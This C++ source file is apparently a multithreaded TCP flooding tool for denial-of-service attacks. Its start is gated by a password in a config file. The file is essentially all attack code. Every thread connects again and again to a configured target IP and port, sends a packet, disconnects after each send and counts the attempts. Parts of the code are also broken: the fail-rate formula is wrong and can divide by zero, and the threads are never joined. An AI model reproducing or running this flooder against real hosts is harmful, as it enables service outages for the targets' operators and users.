#include"pch.hpp"
#include"TConfig.hpp"

void ATKLair(bool* run, size_t pack_z, unsigned short port, std::string ip, size_t* ci, size_t* fi)
{
	using namespace sf;
	char* pack = new char[pack_z];
	TcpSocket connect;
	*ci = 0;
	*fi = 0;
	for (; *run; *ci += 1)
	{
		if (connect.connect(ip, port) == Socket::Status::Done)
		{
			//std::cout << "Connected\n";
			connect.send(pack, pack_z);
			connect.disconnect();
			std::this_thread::sleep_for(std::chrono::milliseconds(1));
		}
		else
		{
			//std::cout << "Fail Connect\n";
			connect.disconnect();
			std::this_thread::sleep_for(std::chrono::milliseconds(1));
			*fi += 1;
		}
	}
}

void StartATK(int num, size_t time, size_t pack_z, unsigned short port, std::string ip, size_t fol)
{
	std::thread* thr = new std::thread[num];
	bool* run = new bool[num];
	bool* status = new bool[num];
	size_t* ci = new size_t[num];
	size_t* fi = new size_t[num];
	size_t cit = 0;
	size_t fit = 0;
	size_t citt = 0;
	size_t fitt = 0;
	for (int i = 0;i < num;i++)
	{
		run[i] = true;
		status[i] = false;
		thr[i] = std::thread(ATKLair,&run[i],pack_z, port, ip, &ci[i], &fi[i]);
	}
	std::cout << "all threads are running\n";
	std::cout << "thread num: " << num << ";\npackage size: " << pack_z << ";\nip: " << ip << ";\nport: " << port << ";\ntime: " << time << ";\nout log frequence: " << fol << ";\nout log time: " << time / fol << ";\n";
	for (size_t i = 0; i < time / fol; i++)
	{
		std::this_thread::sleep_for(std::chrono::milliseconds(fol));
		std::cout << "time: " << i * fol << std::endl;
		for (size_t j = 0; j < num; j++)
		{
			cit += ci[j];
			fit += fi[j];
			std::cout << "id: " << j << "; connect: " << ci[j] << "; fail: " << fi[j] << ";\n";
			ci[j] = 0;
			fi[j] = 0;
		}
		citt += cit;
		fitt += fit;
		std::cout << "id: total " << i << "; connect: " << cit << "; fail: " << fit << ";\n";
		cit = 0;
		fit = 0;
	}
	for (int i = 0; i < num; i++)
	{
		run[i] = false;
	}
	std::cout << "all thread have stopped\n";
	std::cout << "id: total total" << "; connect: " << citt << "; fail: " << fitt << ";\nfail rate: " << (citt / fitt) / 100 << ";\n";
}

int main(int argi,char* argc[])
{
	std::string start;
	std::cout << "start password: ";
	std::cin >> start;
	auto conf = TConfig::ConfigLoadFromFile("ATKConfig.Tconf");
	if (start != conf["password"])
	{
		std::cout << "start password error\n";
		return 1;
	}
	std::cout << "starting\n";
	StartATK(std::stoull(conf["thr_num"]), std::stoull(conf["time"]), std::stoull(conf["pack_z"]), std::stoi(conf["port"]), conf["ip"], std::stoull(conf["F_outlog"]));
	return 0;
}